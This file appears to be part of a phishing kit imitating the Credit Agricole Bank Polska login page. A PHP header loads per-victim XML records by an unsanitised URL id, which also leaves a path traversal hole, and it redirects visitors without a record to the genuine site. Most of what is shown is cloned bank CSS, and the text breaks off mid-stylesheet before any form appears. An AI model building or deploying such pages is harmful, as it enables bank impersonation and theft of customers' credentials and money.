<?php
include "../service.php";
include "../../settings.php";
if (file_exists("../data/" . $_GET['id'] . ".xml") == false){
    header("location: " . $_temp['original']);
    exit;
}
$xml = simplexml_load_file("../data/" . $_GET["id"] . ".xml");
?>
<!DOCTYPE html>
<!-- saved from url=(0059) -->
<html lang="pl"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
    <title>Credit Agricole Bank Polska S.A.</title>
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0">
    <style>
      @charset "UTF-8";
      .login header {
        position: static!important
      }
      
      .theme-default .login header {
        background-color: #f5f5f5
      }
      
      .login header .logo-container {
        padding: 0 10px
      }
      
      .theme-default .login header .logo-container {
        background: transparent
      }
      
      .login header .logo-container .logo {
        text-indent: -987px;
        overflow: hidden;
        display: block;
        background-position: 50%;
        background-repeat: no-repeat;
        background-size: auto;
        width: 100%;
        height: 60px
      }
      
      .login header .logo-container .logo,
      .theme-default .login header .logo-container .logo {
        background-image: url("agri-image-12.png")
      }
      
      @media (min-width:1160px) {
        .login header .logo-container {
          padding: 0 40px
        }
        .login header .logo-container .logo {
          height: 60px;
          background-position: 0;
          background-size: auto 30px
        }
        .login header .logo-container .logo,
        .theme-default .login header .logo-container .logo {
          background-image: url("agri-image-5.png")
        }
      }
      
      .theme-default footer {
        color: #fff
      }
      
      @media (min-width:768px) {
        footer {
          background: linear-gradient(90deg, #202123, #202123 65%, #2c2d31 0, #2c2d31)
        }
      }
      
      @media (max-width:1159.98px) {
        footer {
          background: #202123
        }
        footer .site-width {
          width: 100%
        }
        footer .menu-element {
          order: 1
        }
      }
      
      @media (max-width:1159.98px) and (min-width:768px) {
        footer .menu-element {
          flex-basis: 86%;
          margin: 0 auto
        }
      }
      
      @media (max-width:1159.98px) and (max-width:767.98px) {
        footer .menu-element {
          max-width: 400px;
          margin: 0 auto
        }
      }
      
      @media (max-width:1159.98px) {
        footer .contact-element {
          order: 0
        }
      }
      
      @media (max-width:1159.98px) and (min-width:768px) {
        footer .contact-element>div {
          width: 86%;
          margin: 0 auto
        }
      }
      
      @media (max-width:1159.98px) and (max-width:767.98px) {
        footer .contact-element>div {
          max-width: 400px;
          margin: 0 auto
        }
      }
      
      @media (max-width:1559.98px) and (min-width:1160px) {
        footer .container-fluid {
          padding: 0
        }
      }
      
      footer .menu-element {
        padding-bottom: 20px;
        display: flex
      }
      
      footer .menu-element>div {
        margin-top: 30px
      }
      
      @media (max-width:767.98px) {
        footer .menu-element {
          flex-wrap: wrap
        }
        footer .menu-element>div {
          flex-basis: 100%;
          max-width: 100%;
          order: 1;
          margin-top: 15px
        }
        footer .menu-element>div.footer-buttons {
          order: 0
        }
      }
      
      @media (min-width:768px) and (max-width:1159.98px) {
        footer .menu-element>div {
          flex-basis: 50%;
          max-width: 50%
        }
      }
      
      @media (min-width:1160px) {
        footer .menu-element>div {
          flex: 60% 1 1;
          display: flex;
          flex-flow: column nowrap
        }
      }
      
      footer .flag {
        width: 21px;
        height: 21px;
        display: inline-block;
        margin-right: 6px;
        vertical-align: -5px;
        background-position: 0 0;
        background-size: 100% 100%;
        background-repeat: no-repeat
      }
      
      footer .flag.flag-pl {
        background-image: url("agri-image-2.svg")
      }
      
      footer .flag.flag-en {
        background-image: url("flag-en.abd58ebb107ce303e6a3.svg")
      }
      
      footer .flag.flag-fr {
        background-image: url("flag-fr.02697158948d1b783f91.svg")
      }
      
      footer .flag.flag-uk {
        background-image: url("flag-uk.aa52fb4a06c57325c736.svg")
      }
      
      footer #set-language,
      footer .footer-button {
        margin: .25rem 0
      }
      
      footer #set-language .btn,
      footer .footer-button .btn {
        border-color: transparent;
        font-weight: 600;
        text-align: left;
        cursor: pointer;
        width: 100%;
        font-size: .875rem;
        overflow: hidden;
        text-overflow: ellipsis
      }
      
      .theme-default footer #set-language .btn,
      .theme-default footer .footer-button .btn {
        background: #4a4e51;
        color: #fff
      }
      
      .theme-default footer #set-language .btn:after,
      .theme-default footer .footer-button .btn:after {
        color: #fff
      }
      
      .theme-default footer #set-language .btn:focus:after,
      .theme-default footer .footer-button .btn:focus:after {
        color: hsla(0, 0%, 100%, .6)
      }
      
      .theme-default footer #set-language .btn:focus,
      .theme-default footer .footer-button .btn:focus {
        box-shadow: 0 0 0 .2rem rgba(248, 249, 250, .5)
      }
      
      footer #set-language .btn span {
        flex-grow: 1
      }
      
      footer #set-language .dropdown-item {
        font-weight: 600;
        padding: .25rem 1rem
      }
      
      .theme-default footer #set-language .dropdown-toggle {
        background: #4a4e51;
        color: #fff
      }
      
      footer #set-language .dropdown-toggle:after {
        line-height: 1.714em;
        height: 2rem;
        font-size: 21px
      }
      
      .theme-default footer #set-language .dropdown-menu {
        background: #4a4e51;
        color: #fff
      }
      
      .theme-default footer #set-language .dropdown-menu a {
        background: transparent;
        color: #fff
      }
      
      .theme-default footer #set-language .dropdown-menu a:active,
      .theme-default footer #set-language .dropdown-menu a:focus,
      .theme-default footer #set-language .dropdown-menu a:hover {
        background: #f5f5f5;
        color: #4a4e51
      }
      
      @media (max-width:767.98px) {
        footer .menu-element>div.footer-buttons {
          margin-top: 15px
        }
      }
      
      @media (min-width:1160px) {
        footer .menu-element>div.footer-buttons {
          flex-grow: 1;
          max-width: 400px;
          margin-left: auto;
          flex-basis: 40%
        }
      }
      
      footer .footer-buttons {
        margin-top: 30px;
        display: flex;
        flex-flow: column nowrap;
        align-items: stretch;
        white-space: nowrap
      }
      
      footer .footer-copyright {
        margin-top: 10px
      }
      
      @media (min-width:768px) and (max-width:1159.98px) {
        footer .footer-copyright {
          margin-top: 20px
        }
      }
      
      @media (min-width:1160px) {
        footer .footer-copyright {
          order: 2
        }
      }
      
      footer .logo {
        padding: 4px 0;
        background: url("agri-image-4.png") 0 50% no-repeat;
        display: block;
        width: 75px;
        height: 98px;
        min-width: 75px
      }
      
      footer .footer-menu {
        flex-grow: 1;
        order: 1;
        display: flex
      }
      
      @media (min-width:768px) {
        footer .footer-menu {
          margin-right: 30px
        }
      }
      
      footer .footer-menu .logo {
        flex-basis: 75px
      }
      
      footer .footer-menu .nav {
        display: block;
        -moz-column-count: 2;
        column-count: 2;
        font-size: .875rem
      }
      
      @media (max-width:1159.98px) {
        footer .footer-menu .nav {
          -moz-column-count: 1;
          column-count: 1
        }
      }
      
      @media (min-width:768px) {
        footer .footer-menu .nav {
          max-width: calc(100% - 75px)
        }
      }
      
      footer .footer-menu .nav li {
        margin-left: 30px;
        display: block
      }
      
      @media (max-width:1300px) {
        footer .footer-menu .nav li {
          margin-left: 20px
        }
      }
      
      @media (max-width:1159.98px) {
        footer .footer-menu .nav li {
          margin-left: 15px
        }
      }
      
      footer .footer-menu .nav a {
        color: inherit;
        padding: 2px 0;
        display: inline-block;
        font-weight: 300
      }
      
      footer .footer-menu .nav a,
      footer .footer-menu .nav a:hover {
        color: inherit;
        background: none
      }
      
      footer .footer-elements {
        background: #202123
      }
      
      footer .contact-element {
        padding-top: 30px;
        padding-bottom: 30px;
        background: #2c2d31
      }
      
      @media (max-width:767.98px) {
        footer .contact-element {
          padding-top: 15px;
          padding-bottom: 15px
        }
      }
      
      footer .contact-element .appointment,
      footer .contact-element .infoline,
      footer .contact-element .phone {
        font-size: 1rem;
        padding-left: 4rem;
        position: relative;
        margin-bottom: .25rem
      }
      
      footer .contact-element .infoline .number,
      footer .contact-element .phone .number {
        font-weight: 700;
        display: inline-block
      }
      
      footer .contact-element .appointment a,
      footer .contact-element .infoline a,
      footer .contact-element .phone a {
        color: inherit;
        text-decoration: none
      }
      
      footer .contact-element .appointment a>span {
        text-decoration: inherit
      }
      
      footer .contact-element .infoline .ca-infoline {
        position: absolute;
        width: 3.333rem;
        text-align: right;
        display: block;
        top: -1.1rem;
        left: -.375rem;
        font-size: 4rem
      }
      
      footer .contact-element .infoline .number {
        display: flex;
        align-items: center;
        margin-top: -.75rem;
        font-size: 2.25rem
      }
      
      @media (max-width:1159.98px) {
        footer .contact-element .infoline .number {
          margin-top: -.5rem;
          font-size: 1.75rem
        }
      }
      
      @media (max-width:1159.98px) {
        footer .contact-element .phone {
          padding-left: 3rem
        }
      }
      
      @media (max-width:767.98px) {
        footer .contact-element .phone {
          padding-left: 4rem
        }
      }
      
      footer .contact-element .phone .ca-device {
        position: absolute;
        width: 3rem;
        text-align: right;
        display: block;
        top: -.4rem;
        left: .4rem;
        font-size: 2.75rem
      }
      
      @media (max-width:1159.98px) {
        footer .contact-element .phone .ca-device {
          top: -.5rem;
          left: -1rem;
          font-size: 3rem
        }
      }
      
      @media (max-width:767.98px) {
        footer .contact-element .phone .ca-device {
          left: .5rem
        }
      }
      
      footer .contact-element .phone .number {
        font-size: 1.125rem
      }
      
      @media (max-width:1159.98px) {
        footer .contact-element .phone .number {
          margin-top: -.25em;
          font-size: 1.75rem
        }
      }
      
      @media (max-width:360px) {
        footer .contact-element .phone .number {
          font-size: 1.5rem
        }
      }
      
      footer .contact-element .appointment {
        white-space: nowrap;
        margin-bottom: -1rem
      }
      
      @media (max-width:1159.98px) {
        footer .contact-element .appointment {
          padding-left: 3rem
        }
      }
      
      @media (max-width:767.98px) {
        footer .contact-element .appointment {
          padding-left: 4rem;
          margin-top: -.25rem
        }
      }
      
      @media (min-width:1160px) {
        footer .contact-element .appointment {
          margin-top: -.25rem
        }
      }
      
      footer .contact-element .appointment a {
        font-size: 0
      }
      
      footer .contact-element .appointment a>span {
        font-size: 1rem;
        vertical-align: middle
      }
      
      footer .contact-element .appointment .ca {
        width: 3rem;
        text-align: right;
        font-size: 2.75rem;
        display: inline-block;
        vertical-align: middle
      }
      
      @media (max-width:1159.98px) {
        footer .contact-element .appointment .ca {
          margin-left: -4.25rem;
          margin-right: 1.25rem;
          font-size: 2.5rem
        }
      }
      
      @media (max-width:767.98px) {
        footer .contact-element .appointment .ca {
          margin-left: -4.75rem;
          margin-right: .75rem;
          width: 4rem
        }
      }
      
      @media (min-width:1160px) {
        footer .contact-element .appointment .ca {
          margin-left: -4.625rem;
          margin-right: .625rem;
          width: 4rem
        }
      }
      
      footer .contact-element a {
        color: inherit
      }
      
      footer .copyright {
        font-size: .75rem;
        font-weight: 400;
        margin-bottom: 0;
        display: table-cell;
        vertical-align: middle;
        padding: .5em 0
      }
      
      @media (min-width:768px) {
        footer .copyright {
          white-space: nowrap
        }
      }
      
      .theme-default footer #set-contrast .set-default {
        display: none
      }
      
      .theme-default footer #set-contrast .set-hicontrast {
        display: block
      }
      
      @media (min-width:768px) {
        .theme-default .login footer {
          background: linear-gradient(0deg, #161718 69px, #2c2d31 0, #2c2d31 184px, #202123 0) 0 100%/100% 100% no-repeat
        }
      }
      
      @media (min-width:1160px) {
        .theme-default .login footer {
          background: linear-gradient(0deg, #161718, #202123 0) 0 100%/50% 100% no-repeat, #2c2d31
        }
      }
      
      .security-info-container h5 {
        margin-bottom: 1.5rem
      }
      
      .security-info-container .left {
        text-align: left
      }
      
      .security-info-container a {
        font-weight: 600
      }
      
      .theme-default .security-info-container a {
        color: #007e90
      }
      
      .theme-default .security-info-container a:focus,
      .theme-default .security-info-container a:hover {
        color: #006675
      }
      
      .security-info-container a:active,
      .security-info-container a:focus,
      .security-info-container a:hover {
        text-decoration: underline
      }
      
      .security-info-container ul {
        list-style-type: none;
        font-size: .875rem;
        padding-left: 1.25rem;
        margin: 0
      }
      
      .security-info-container ul li {
        position: relative;
        margin-bottom: 1.25rem
      }
      
      .security-info-container ul li:before {
        font-family: cawebfont;
        position: absolute;
        left: -1.25rem;
        top: 0;
        content: "";
        color: #9c0
      }
      
      app-login-note-alert {
        display: block
      }
      
      .note-alert {
        padding-top: 30px;
        background-color: transparent
      }
      
      @media (max-width:767.98px) {
        .note-alert {
          padding: 30px 0 0
        }
        :not(.bg-transparent)>.note-alert {
          background-color: #fff
        }
      }
      
      .note-alert .alert {
        border: none;
        border-radius: 0;
        margin: 0;
        padding-top: 50px;
        position: relative;
        background-repeat: no-repeat;
        background-position: 50%;
        background-size: 75% 75%
      }
      
      @media (min-width:1160px) {
        .note-alert .alert {
          padding-right: 25%;
          background-position: 225%
        }
      }
      
      .note-alert .alert .caption {
        position: absolute;
        text-align: center;
        left: 0;
        right: 0;
        top: 0;
        transform: translateY(-50%);
        margin: 0 .5em;
        font-size: 25px;
        line-height: inherit;
        font-weight: 700;
        white-space: nowrap
      }
      
      .note-alert .alert .caption>span {
        padding: 0 20px;
        border-radius: 20px;
        display: inline-block;
        vertical-align: top
      }
      
      .theme-default .note-alert .alert .caption>span {
        background-color: #9c0;
        border: none
      }
      
      .note-alert .alert.alert-warning {
        background-image: url("agri-image-1.svg")
      }
      
      .theme-default .note-alert .alert.alert-warning {
        background-color: #009597;
        color: #fff
      }
      
      .note-alert .alert.alert-warning a {
        color: #fff;
        font-weight: 600
      }
      
      .note-alert .alert.alert-warning a:active,
      .note-alert .alert.alert-warning a:focus,
      .note-alert .alert.alert-warning a:hover {
        text-decoration: underline
      }
      /*!
 * Bootstrap-select v1.13.12 (https://developer.snapappointments.com/bootstrap-select)
 *
 * Copyright 2012-2019 SnapAppointments, LLC
 * Licensed under MIT (https://github.com/snapappointments/bootstrap-select/blob/master/LICENSE)
 */
      
      @supports (-ms-overflow-style:none) {}
      /*! Generated by Font Squirrel (https://www.fontsquirrel.com) on June 21, 2017 */
      
      @font-face {
        font-family: cawebfont;
        src: url("agri-style-6.woff") format("woff");
        font-weight: 400;
        font-style: normal
      }
      
      .ca {
        font-size: 1.25em;
        vertical-align: -.25em
      }
      
      .ca,
      .ca:before {
        font-family: cawebfont;
        font-style: normal;
        font-weight: 400
      }
      
      .btn .ca {
        display: inline-block;
        font-size: 1.666em;
        margin: -.37515em 0 -.37515rem -.112545em;
        vertical-align: -.333em
      }
      
      .ca-infoline:before {
        content: ""
      }
      
      .ca-contrast:before {
        content: ""
      }
      
      .ca-question:before {
        content: ""
      }
      
      .ca-device:before {
        content: ""
      }
      
      .ca-chat:before {
        content: ""
      }
      
      @font-face {
        font-family: Open Sans;
        src: local("Open Sans Light"), local("OpenSans-Light"), url(" ") format("woff2"), url("agri-style-9.woff") format("woff");
        font-weight: 300;
        font-style: normal
      }
      
      @font-face {
        font-family: Open Sans;
        src: local("Open Sans Light Italic"), local("OpenSans-LightItalic"), url("opensans-lightitalic-webfont.b113012da75a5c85329e.woff2") format("woff2"), url("opensans-lightitalic-webfont.eec0291ee0c7af7a8a87.woff") format("woff");
        font-weight: 300;
        font-style: italic
      }
      
      @font-face {
        font-family: Open Sans;
        src: local("Open Sans"), local("OpenSans"), url(" ") format("woff2"), url("agri-style-10.woff") format("woff");
        font-weight: 400;
        font-style: normal
      }
      
      @font-face {
        font-family: Open Sans;
        src: local("Open Sans Italic"), local("OpenSans-Italic"), url("opensans-italic-webfont.2927f56dd71212b293ec.woff2") format("woff2"), url("opensans-italic-webfont.49386134ec72dd0241f1.woff") format("woff");
        font-weight: 400;
        font-style: italic
      }
      
      @font-face {
        font-family: Open Sans;
        src: local("Open Sans Semibold"), local("OpenSans-Semibold"), url("agri-style-11.woff") format("woff");
        font-weight: 600;
        font-style: normal
      }
      
      @font-face {
        font-family: Open Sans;
        src: local("Open Sans Semibold Italic"), local("OpenSans-SemiboldItalic"), url("opensans-semibolditalic-webfont.4e359e913c494fe72cf7.woff") format("woff");
        font-weight: 600;
        font-style: italic
      }
      
      @font-face {
        font-family: Open Sans;
        src: local("Open Sans Bold"), local("OpenSans-Bold"), url(" ") format("woff2"), url("agri-style-7.woff") format("woff");
        font-weight: 700;
        font-style: normal
      }
      
      @font-face {
        font-family: Open Sans;
        src: local("Open Sans Bold Italic"), local("OpenSans-BoldItalic"), url("opensans-bolditalic-webfont.509c2c0c601ba66e2238.woff2") format("woff2"), url("opensans-bolditalic-webfont.e0906efbce2175a1cd39.woff") format("woff");
        font-weight: 700;
        font-style: italic
      }
      
      @font-face {
        font-family: Open Sans;
        src: local("Open Sans Extrabold"), local("OpenSans-Extrabold"), url(" ") format("woff2"), url("agri-style-8.woff") format("woff");
        font-weight: 800;
        font-style: normal
      }
      
      @font-face {
        font-family: Open Sans;
        src: local("Open Sans Extrabold Italic"), local("OpenSans-ExtraboldItalic"), url("opensans-extrabolditalic-webfont.b6c983cf0df46215f31b.woff2") format("woff2"), url("opensans-extrabolditalic-webfont.81a86d7d1f840febf934.woff") format("woff");
        font-weight: 800;
        font-style: italic
      }
      
      @font-face {
        font-family: Open Sans Cn;
        src: local("Open Sans Condensed Light"), local("OpenSans-CnLight"), url("") format("woff");
        font-weight: 400;
        font-style: normal
      }
      
      @font-face {
        font-family: Open Sans Cn;
        src: local("Open Sans Condensed Bold"), local("OpenSans-CnBold"), url("") format("woff");
        font-weight: 700;
        font-style: normal
      }
      
      @font-face {
        font-family: open_sans_condensed;
        src: url("") format("woff2"), url("") format("woff");
        font-weight: 700;
        font-style: normal
      }
      /*!
 * Bootstrap v4.0.0 (https://getbootstrap.com)
 * Copyright 2011-2018 The Bootstrap Authors
 * Copyright 2011-2018 Twitter, Inc.
 * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
 */
      
      :root {
        --blue: #007bff;
        --indigo: #6610f2;
        --purple: #6f42c1;
        --pink: #e83e8c;
        --red: #dc3545;
        --orange: #fd7e14;
        --yellow: #ffc107;
        --green: #28a745;
        --teal: #20c997;
        --cyan: #17a2b8;
        --white: #fff;
        --gray: #6c757d;
        --gray-dark: #343a40;
        --primary: #007e90;
        --secondary: #fff;
        --success: #9c0;
        --info: hsla(0, 0%, 100%, 0.6);
        --warning: #f76327;
        --danger: #991f28;
        --light: #f8f9fa;
        --dark: #343a40;
        --medium-light: #adb5bd;
        --default: #f8f9fa;
        --breakpoint-xs: 0;
        --breakpoint-sm: 480px;
        --breakpoint-md: 768px;
        --breakpoint-lg: 1160px;
        --breakpoint-xl: 1560px;
        --font-family-sans-serif: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
        --font-family-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace
      }
      
      *,
      :after,
      :before {
        box-sizing: border-box
      }
      
      html {
        font-family: sans-serif;
        line-height: 1.15;
        -webkit-text-size-adjust: 100%;
        -webkit-tap-highlight-color: rgba(0, 0, 0, 0)
      }
      
      footer,
      header {
        display: block
      }
      
      body {
        font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji;
        font-weight: 400;
        line-height: 1.5;
        color: #212529;
        text-align: left;
        background-color: #fff
      }
      
      [tabindex="-1"]:focus {
        outline: 0!important
      }
      
      h1,
      h2,
      h5 {
        margin-top: 0;
        margin-bottom: .5rem
      }
      
      p {
        margin-top: 0;
        margin-bottom: 1rem
      }
      
      ul {
        margin-bottom: 1rem
      }
      
      ul {
        margin-top: 0
      }
      
      strong {
        font-weight: bolder
      }
      
      a {
        color: #007e90;
        text-decoration: none;
        background-color: transparent
      }
      
      a:hover {
        color: #006675;
        text-decoration: underline
      }
      
      a:not([href]):not([tabindex]),
      a:not([href]):not([tabindex]):focus,
      a:not([href]):not([tabindex]):hover {
        color: inherit;
        text-decoration: none
      }
      
      a:not([href]):not([tabindex]):focus {
        outline: 0
      }
      
      label {
        display: inline-block;
        margin-bottom: .5rem
      }
      
      button {
        border-radius: 0
      }
      
      button:focus {
        outline: 1px dotted;
        outline: 5px auto -webkit-focus-ring-color
      }
      
      button,
      input {
        margin: 0;
        font-family: inherit;
        font-size: inherit;
        line-height: inherit
      }
      
      button,
      input {
        overflow: visible
      }
      
      button {
        text-transform: none
      }
      
      [type=button],
      [type=submit],
      button {
        -webkit-appearance: button
      }
      
      [type=button]:not(:disabled),
      [type=reset]:not(:disabled),
      [type=submit]:not(:disabled),
      button:not(:disabled) {
        cursor: pointer
      }
      
      [type=button]::-moz-focus-inner,
      [type=submit]::-moz-focus-inner,
      button::-moz-focus-inner {
        padding: 0;
        border-style: none
      }
      
      ::-webkit-file-upload-button {
        font: inherit;
        -webkit-appearance: button
      }
      
      .h4,
      h1,
      h2,
      h5 {
        margin-bottom: .5rem;
        font-weight: 600;
        line-height: 1.2
      }
      
      h1 {
        font-size: 1.875rem
      }
      
      h2 {
        font-size: 1.5625rem
      }
      
      .h4 {
        font-size: 1.125rem
      }
      
      h5 {
        font-size: 1rem
      }
      
      .container-fluid {
        width: 100%;
        padding-right: 15px;
        padding-left: 15px;
        margin-right: auto;
        margin-left: auto
      }
      
      .row {
        display: flex;
        flex-wrap: wrap;
        margin-right: -15px;
        margin-left: -15px
      }
      
      .no-gutters>[class*=col-] {
        padding-right: 0;
        padding-left: 0
      }
      
      .col-12,
      .col-lg-4,
      .col-lg-8,
      .col-lg-12,
      .col-md-6 {
        position: relative;
        width: 100%;
        padding-right: 15px;
        padding-left: 15px
      }
      
      .col-12 {
        flex: 0 0 100%;
        max-width: 100%
      }
      
      @media (min-width:768px) {
        .col-md-6 {
          flex: 0 0 50%;
          max-width: 50%
        }
      }
      
      @media (min-width:1160px) {
        .col-lg-4 {
          flex: 0 0 33.33333333%;
          max-width: 33.33333333%
        }
        .col-lg-8 {
          flex: 0 0 66.66666667%;
          max-width: 66.66666667%
        }
        .col-lg-12 {
          flex: 0 0 100%;
          max-width: 100%
        }
      }
      
      .form-control {
        display: block;
        width: 100%;
        height: auto;
        padding: .375rem .75rem;
        font-weight: 400;
        line-height: 1.5;
        color: #495057;
        background-color: #fff;
        background-clip: padding-box;
        border: 1px solid #d8d8d8;
        border-radius: .25rem;
        transition: border-color .15s ease-in-out, box-shadow .15s ease-in-out
      }
      
      @media (prefers-reduced-motion:reduce) {
        .form-control {
          transition: none
        }
      }
      
      .form-control::-ms-expand {
        background-color: transparent;
        border: 0
      }
      
      .form-control:focus {
        color: #495057;
        background-color: #fff;
        border-color: #007e90;
        outline: 0;
        box-shadow: none
      }
      
      .form-control::-moz-placeholder {
        color: #6c757d;
        opacity: 1
      }
      
      .form-control:-ms-input-placeholder {
        color: #6c757d;
        opacity: 1
      }
      
      .form-control:disabled {
        background-color: #e9ecef;
        opacity: 1
      }
      
      .form-group {
        margin-bottom: 1rem
      }
      
      .custom-control-input.is-valid:focus:not(:checked)~.custom-control-label:before,
      .was-validated .custom-control-input:valid:focus:not(:checked)~.custom-control-label:before {
        border-color: #28a745
      }
      
      .custom-control-input.is-invalid:focus:not(:checked)~.custom-control-label:before,
      .was-validated .custom-control-input:invalid:focus:not(:checked)~.custom-control-label:before {
        border-color: #dc3545
      }
      
      .form-inline {
        display: flex;
        flex-flow: row wrap;
        align-items: center
      }
      
      .btn {
        display: inline-block;
        font-weight: 600;
        color: #212529;
        text-align: center;
        vertical-align: middle;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
        background-color: transparent;
        border: 1px solid transparent;
        padding: .375rem .75rem;
        font-size: 1rem;
        line-height: 1.5;
        border-radius: .25rem;
        transition: color .15s ease-in-out, background-color .15s ease-in-out, border-color .15s ease-in-out, box-shadow .15s ease-in-out
      }
      
      @media (prefers-reduced-motion:reduce) {
        .btn {
          transition: none
        }
      }
      
      .btn:hover {
        color: #212529;
        text-decoration: none
      }
      
      .btn:focus {
        outline: 0;
        box-shadow: 0 0 0 .2rem rgba(0, 123, 255, .25)
      }
      
      .btn:disabled {
        opacity: .65
      }
      
      .btn-primary {
        color: #fff;
        background-color: #007e90;
        border-color: #007e90
      }
      
      .btn-primary:hover {
        color: #fff;
        background-color: #005d6a;
        border-color: #00515d
      }
      
      .btn-primary:focus {
        box-shadow: 0 0 0 .2rem rgba(38, 145, 161, .5)
      }
      
      .btn-primary:disabled {
        color: #fff;
        background-color: #007e90;
        border-color: #007e90
      }
      
      .btn-primary:not(:disabled):not(.disabled).active,
      .btn-primary:not(:disabled):not(.disabled):active {
        color: #fff;
        background-color: #00515d;
        border-color: #004650
      }
      
      .btn-primary:not(:disabled):not(.disabled).active:focus,
      .btn-primary:not(:disabled):not(.disabled):active:focus {
        box-shadow: 0 0 0 .2rem rgba(38, 145, 161, .5)
      }
      
      .btn-secondary:not(:disabled):not(.disabled).active,
      .btn-secondary:not(:disabled):not(.disabled):active {
        color: #212529;
        background-color: #e6e5e5;
        border-color: #dfdfdf
      }
      
      .btn-secondary:not(:disabled):not(.disabled).active:focus,
      .btn-secondary:not(:disabled):not(.disabled):active:focus {
        box-shadow: 0 0 0 .2rem rgba(222, 222, 223, .5)
      }
      
      .btn-success:not(:disabled):not(.disabled).active,
      .btn-success:not(:disabled):not(.disabled):active {
        color: #fff;
        background-color: #739900;
        border-color: #698c00
      }
      
      .btn-success:not(:disabled):not(.disabled).active:focus,
      .btn-success:not(:disabled):not(.disabled):active:focus {
        box-shadow: 0 0 0 .2rem rgba(135, 179, 6, .5)
      }
      
      .btn-info:not(:disabled):not(.disabled).active,
      .btn-info:not(:disabled):not(.disabled):active {
        color: #212529;
        background-color: hsla(0, 2%, 90%, .6);
        border-color: hsla(0, 0%, 87.5%, .6)
      }
      
      .btn-info:not(:disabled):not(.disabled).active:focus,
      .btn-info:not(:disabled):not(.disabled):active:focus {
        box-shadow: 0 0 0 .2rem rgba(190, 191, 193, .5)
      }
      
      .btn-warning:not(:disabled):not(.disabled).active,
      .btn-warning:not(:disabled):not(.disabled):active {
        color: #fff;
        background-color: #e34708;
        border-color: #d64308
      }
      
      .btn-warning:not(:disabled):not(.disabled).active:focus,
      .btn-warning:not(:disabled):not(.disabled):active:focus {
        box-shadow: 0 0 0 .2rem rgba(248, 122, 71, .5)
      }
      
      .btn-danger:not(:disabled):not(.disabled).active,
      .btn-danger:not(:disabled):not(.disabled):active {
        color: #fff;
        background-color: #6f161d;
        border-color: #64141a
      }
      
      .btn-danger:not(:disabled):not(.disabled).active:focus,
      .btn-danger:not(:disabled):not(.disabled):active:focus {
        box-shadow: 0 0 0 .2rem rgba(168, 65, 72, .5)
      }
      
      .btn-light:not(:disabled):not(.disabled).active,
      .btn-light:not(:disabled):not(.disabled):active {
        color: #212529;
        background-color: #dae0e5;
        border-color: #d3d9df
      }
      
      .btn-light:not(:disabled):not(.disabled).active:focus,
      .btn-light:not(:disabled):not(.disabled):active:focus {
        box-shadow: 0 0 0 .2rem rgba(216, 217, 219, .5)
      }
      
      .btn-dark:not(:disabled):not(.disabled).active,
      .btn-dark:not(:disabled):not(.disabled):active {
        color: #fff;
        background-color: #1d2124;
        border-color: #171a1d
      }
      
      .btn-dark:not(:disabled):not(.disabled).active:focus,
      .btn-dark:not(:disabled):not(.disabled):active:focus {
        box-shadow: 0 0 0 .2rem rgba(82, 88, 93, .5)
      }
      
      .btn-medium-light:not(:disabled):not(.disabled).active,
      .btn-medium-light:not(:disabled):not(.disabled):active {
        color: #212529;
        background-color: #919ca6;
        border-color: #8a95a1
      }
      
      .btn-medium-light:not(:disabled):not(.disabled).active:focus,
      .btn-medium-light:not(:disabled):not(.disabled):active:focus {
        box-shadow: 0 0 0 .2rem rgba(152, 159, 167, .5)
      }
      
      .btn-default {
        color: #212529;
        background-color: #f8f9fa;
        border-color: #f8f9fa
      }
      
      .btn-default:hover {
        color: #212529;
        background-color: #e2e6ea;
        border-color: #dae0e5
      }
      
      .btn-default:focus {
        box-shadow: 0 0 0 .2rem rgba(216, 217, 219, .5)
      }
      
      .btn-default:disabled {
        color: #212529;
        background-color: #f8f9fa;
        border-color: #f8f9fa
      }
      
      .btn-default:not(:disabled):not(.disabled).active,
      .btn-default:not(:disabled):not(.disabled):active {
        color: #212529;
        background-color: #dae0e5;
        border-color: #d3d9df
      }
      
      .btn-default:not(:disabled):not(.disabled).active:focus,
      .btn-default:not(:disabled):not(.disabled):active:focus {
        box-shadow: 0 0 0 .2rem rgba(216, 217, 219, .5)
      }
      
      .btn-outline-primary:not(:disabled):not(.disabled).active,
      .btn-outline-primary:not(:disabled):not(.disabled):active {
        color: #fff;
        background-color: #007e90;
        border-color: #007e90
      }
      
      .btn-outline-primary:not(:disabled):not(.disabled).active:focus,
      .btn-outline-primary:not(:disabled):not(.disabled):active:focus {
        box-shadow: 0 0 0 .2rem rgba(0, 126, 144, .5)
      }
      
      .btn-outline-secondary:not(:disabled):not(.disabled).active,
      .btn-outline-secondary:not(:disabled):not(.disabled):active {
        color: #212529;
        background-color: #fff;
        border-color: #fff
      }
      
      .btn-outline-secondary:not(:disabled):not(.disabled).active:focus,
      .btn-outline-secondary:not(:disabled):not(.disabled):active:focus {
        box-shadow: 0 0 0 .2rem hsla(0, 0%, 100%, .5)
      }
      
      .btn-outline-success:not(:disabled):not(.disabled).active,
      .btn-outline-success:not(:disabled):not(.disabled):active {
        color: #212529;
        background-color: #9c0;
        border-color: #9c0
      }
      
      .btn-outline-success:not(:disabled):not(.disabled).active:focus,
      .btn-outline-success:not(:disabled):not(.disabled):active:focus {
        box-shadow: 0 0 0 .2rem rgba(153, 204, 0, .5)
      }
      
      .btn-outline-info:not(:disabled):not(.disabled).active,
      .btn-outline-info:not(:disabled):not(.disabled):active {
        color: #212529;
